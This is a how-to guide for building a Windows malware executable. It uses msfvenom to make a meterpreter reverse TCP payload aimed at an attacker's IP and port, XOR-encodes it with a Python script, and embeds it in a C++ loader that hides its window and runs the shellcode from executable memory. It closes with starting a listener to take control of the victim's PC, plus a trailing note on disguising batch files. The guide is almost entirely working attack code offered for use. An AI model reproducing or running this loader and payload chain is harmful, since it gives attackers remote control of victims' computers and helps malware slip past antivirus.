1. Create a payload using msfvenom using the command:
msfvenom -p windows/x64/meterpreter_reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST="AttackerIP" LPORT="AttackerPort" -f raw -o raw.txt

--------------------------------------------------------------------------------------

2. Pass this through a simple python script that will run the XOR encryption through this output and spits out the encrypted version of the shellcode. 

import sys
KEY = "x"
def xor(data, key):
	key = str(key)
	l = len(key)
	output_str = ""
	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	return output_str
def printCiphertext(ciphertext):
	print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
try:
	plaintext = open(sys.argv[1], "rb").read()
except:
	print("File argument needed! %s " % sys.argv[0])
	sys.exit()
ciphertext = xor(plaintext, KEY)
print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')


---------------------------------------------------------------------------------------------

3. Run Python script pass the raw payload and output the XOR encrypted payload
python xor_encryptor.py raw.txt > xor_output.txt

---------------------------------------------------------------------------------------------

4.  This output is to be copied and pasted  in the c++ file (main.cpp). The code for main.cpp is as follows:
Copy the xor_output in this script "char b[] = {};"

#include <cstring>
#define _WIN32_WINNT 0x0500
#include<windows.h>

int main(int argc, char **argv) {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char b[] = { /*xor_output*/};
	char c[sizeof b];
	for (int i = 0; i < sizeof b; i++) {c[i] = b[i] ^ 'x';}
	void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, c, sizeof c);
	((void(*)())exec)();		
}


----------------------------------------------------------------------------------------------

5. Compile the above C++ file into Portable Windows Executable using  Dev C++ or Visual Studio

----------------------------------------------------------------------------------------------

6.  Malicious File has been Created. Now its time to start METERPRETER LISTNER on our attacker machine( KALI).

----------------------------------------------------------------------------------------------

7. Click on the Malicious EXE file and BOOOM we got the victims PC control on our KALI MACHINE






encrypt batch file 
FF FE 0A 0D
